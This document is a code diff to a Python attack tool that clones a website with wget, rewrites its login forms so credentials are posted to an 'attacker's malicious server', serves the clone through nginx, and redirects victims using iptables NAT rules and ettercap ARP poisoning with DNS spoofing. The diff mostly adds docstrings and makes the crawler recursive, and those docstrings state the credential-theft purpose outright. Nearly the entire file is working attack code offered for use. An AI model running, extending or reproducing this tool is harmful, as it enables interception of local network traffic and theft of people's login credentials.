@@ -6,9 +6,14 @@ import socket
 import fcntl
 import struct
 
+# List of required programs
 EXECUTABLES = ['nginx', 'ettercap', 'locate', 'httrack', 'sslstrip']
 
 def find_file(file_name):
+    """
+    Given a file name, finds and returns the file's absolute location.
+    Uses the locate program found in Unix.
+    """
     output = subprocess.Popen(['locate',file_name], stdout=subprocess.PIPE).communicate()[0]
     output_list = output.decode().split('\n')
     if file_name == 'nginx.conf' and '/etc/nginx/nginx.conf' in output_list:
@@ -29,11 +34,18 @@ def find_file(file_name):
     return conf_path
 
 def find_line(f_data):
+    """
+    Finds line number of file that contains a certain string.
+    """
     for i in range(len(f_data)):
         if 'location /' in f_data[i].strip() and '#' not in f_data[i]:
             return i
 
 def update_nginx_conf(conf_path):
+    """
+    Updates the nginx.conf file so that the nginx
+    document root will point to the correct file location.
+    """
     try:
         with open(conf_path + '.default', 'r') as fd:
             fd_data = fd.readlines()
@@ -61,6 +73,10 @@ def update_nginx_conf(conf_path):
     return default_path
 
 def get_ip_address(ifname):
+    """
+    Gets the IP address given a network interface name.
+    Credit goes to Stack Overflow answer.
+    """
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     return socket.inet_ntoa(fcntl.ioctl(
         s.fileno(),
@@ -69,6 +85,11 @@ def get_ip_address(ifname):
     )[20:24])
 
 def update_etter_dns(conf_path):
+    """
+    Update the etter.dns file so that ettercap can
+    DNS spoof the website name with the attacker's
+    IP address.
+    """
     try:
         ip_address = get_ip_address(sys.argv[2])
     except OSError:
@@ -83,6 +104,10 @@ def update_etter_dns(conf_path):
             f.write(new_line)
 
 def update_form_action(login_path):
+    """
+    Updates the html files in the cloned website so that
+    POST requests are sent to the attacker's malicious server.
+    """
     with open(login_path, 'r') as f:
         f_data = f.readlines()
     index_list = []
@@ -98,22 +123,31 @@ def update_form_action(login_path):
         for l in f_data:
             f.write(l)
 
-def update_pages():
-    website_dir = os.getcwd() + "/" + sys.argv[1].rsplit('@',1)[-1]
+def update_pages(website_dir):
+    """
+    Finds html pages in the website directory
+    and updates their POST requests.
+    """
     for f in os.listdir(website_dir):
-        if f.endswith(".html"):
+        # print(f)
+        if os.path.isdir(website_dir + '/' + f):
+            update_pages(website_dir + '/' + f)
+        elif f.endswith(".html"):
             login_path = website_dir + "/" + f
             update_form_action(login_path)
 
-def call_httrack(default_path):
+def call_programs(default_path):
+    """
+    Calls programs like wget, sslstrip, and ettercap
+    to conduct the exploit.
+    """
     os.chdir(default_path)
     subprocess.call(["rm","-f","index.html"])
     try:
-        subprocess.call(["httrack","--connection-per-second=50","--sockets=80", \
-            "--disable-security-limits","-A100000000","-s0","-n",sys.argv[1]])
+        subprocess.call(["wget","-e","robots=off","--recursive","--no-clobber","--page-requisites","--html-extension","--convert-links", "--restrict-file-names=windows","--domains",sys.argv[1],"--no-parent",sys.argv[1]])
     except KeyboardInterrupt:
         subprocess.call(["rm","hts-in_progress.lock"])
-    update_pages()
+    update_pages(os.getcwd() + "/" + sys.argv[1].rsplit('@',1)[-1])
     subprocess.call(["service","nginx","restart"])
     subprocess.call(["iptables","--flush","-t","nat"])
     subprocess.call(["iptables","-t","nat","-A","PREROUTING","-i",sys.argv[2],"-p","tcp","--destination-port", \
@@ -122,6 +156,10 @@ def call_httrack(default_path):
     subprocess.call(["ettercap","-T","-q","-M","arp","-P","dns_spoof","//","//","-i",sys.argv[2]])
 
 def set_up_nginx(default_path):
+    """
+    Sets up the nginx configuration file so that
+    the program can use it to create the local server.
+    """
     subprocess.call(["wget","https://gist.githubusercontent.com/mxavier6/3d37de2b8a64c202c2077f5e636253ac/raw/4c5b3932d94a5d14f537201dc22f8fb5f1847dad/nginx.conf"])
     subprocess.call(["mv","nginx.conf",default_path.rsplit('/',1)[0]])
     output = subprocess.Popen(['cat','/etc/passwd'], stdout=subprocess.PIPE).communicate()[0]
@@ -131,12 +169,18 @@ def set_up_nginx(default_path):
         subprocess.call(["adduser","--system","--no-create-home","--disabled-login","--disabled-password","--group","nginx"])
 
 def check_executables():
+    """
+    Checks if the system has the necessary executables.
+    """
     for e in EXECUTABLES:
         path_str = shutil.which(e)
         if path_str == None:
             exit("Dependency " + e + " is not found. Please install.")
 
 def check_root():
+    """
+    Checks if program is run by the root user.
+    """
     if os.geteuid() != 0:
         exit("You need root privileges to run this program.")
 
@@ -150,6 +194,9 @@ def print_help():
         "Additionally, the // arguments in the ettercap call should be changed to /// if IPv6 support is enabled.\n")
 
 def main():
+    """
+    Runs the program and calls necessary methods.
+    """
     try:
         if len(sys.argv) ==2 and sys.argv[1] == '-h':
             print_help()
@@ -162,7 +209,7 @@ def main():
             set_up_nginx(default_nginx_path)
             update_etter_dns(find_file("etter.dns"))
             print("Make sure ports 80 and 6666 are open in the firewall.\n")
-            call_httrack(default_nginx_path)
+            call_programs(default_nginx_path)
     except KeyboardInterrupt:
         exit()
 
